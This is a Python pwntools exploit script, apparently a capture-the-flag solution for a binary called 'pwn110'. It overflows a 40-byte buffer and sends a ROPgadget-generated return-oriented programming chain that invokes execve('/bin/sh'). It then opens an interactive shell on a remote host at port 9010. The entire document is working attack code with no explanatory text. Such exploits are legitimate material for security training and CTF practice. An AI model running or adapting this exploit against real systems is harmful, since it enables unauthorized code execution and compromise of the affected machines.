from pwn import *
from struct import pack
DEBUG = 1
if DEBUG == 0 :
    r = process("./pwn110")
else: 
    r = remote("10.10.161.180", 9010)
    
p = b'a'* 40 # offset

# using ROPgadget --binary ./pwn110 --ropchain  we get this payload of execve("/bin/sh", NULL, NULL);
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall

r.recvuntil(b"Now try to pwn me without libc")
r.recvline()
r.sendline(p)
r.interactive()
